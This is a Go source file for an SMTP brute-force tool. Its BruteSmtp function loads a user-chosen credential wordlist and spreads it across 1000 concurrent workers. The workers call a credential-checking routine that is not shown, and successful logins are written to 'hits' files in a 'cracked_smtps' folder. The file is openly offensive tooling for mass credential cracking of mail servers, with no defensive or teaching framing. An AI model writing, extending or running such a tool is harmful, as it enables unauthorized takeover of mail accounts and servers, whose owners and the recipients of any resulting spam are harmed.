package smtpbrute

import (
	"fmt"
	"go_cli/fileutil"
	"strings"
	"sync"
	"time"

	"github.com/fatih/color"
	"github.com/ncruces/zenity"
)

func BruteSmtp() {
	var testEmail string
	fmt.Print("\nEnter test email :> ")
	fmt.Scanln(&testEmail)
	if len(testEmail) == 0 {
		fmt.Println("invalid input!")
		return
	}
	fmt.Println("\nSelect your wordlist: ")
	filePath, err := zenity.SelectFile(
		zenity.FileFilters{
			{Patterns: []string{"*.txt"}, CaseFold: false},
		})
	if err != nil {
		fmt.Printf("err: %v\n", err)
	}
	wordList, _ := fileutil.ReadFromFile(filePath)
	testEmail = strings.TrimSpace(testEmail)
	color.New(color.FgHiMagenta).Printf("\nTotal Wordlist: %d\n\n", len(wordList))

	var wg sync.WaitGroup
	var mutex sync.Mutex
	var totalChecks int

	maxWorkers := 1000
	chunkSize := len(wordList) / maxWorkers

	if len(wordList)%maxWorkers != 0 {
		chunkSize++
	}
	wordListChunks := make(chan []string, chunkSize)

	currentTime := time.Now().Unix()
	fileName := fmt.Sprintf("hits_%v.txt", currentTime)
	file, err := fileutil.WriteToFile("cracked_smtps", fileName)
	if err != nil {
		fmt.Printf("err: %v\n", err)
		return
	}
	defer file.Close()

	// spawn goroutines which will be reading data from the ipChunks channel concurrently.
	for i := 0; i < maxWorkers; i++ {
		wg.Add(1)
		go ProcessCredentials(wordListChunks, file, testEmail, &mutex, &wg, &totalChecks)
	}

	// share wordlist among goroutines by sending calculated chunk data size to worker channel.
	for i := 0; i < len(wordList); i += chunkSize {
		end := i + chunkSize
		if end > len(wordList) {
			end = len(wordList)
		}
		wordListChunks <- wordList[i:end]
	}
	close(wordListChunks)
	wg.Wait()
	fmt.Println("\nall done!")
}
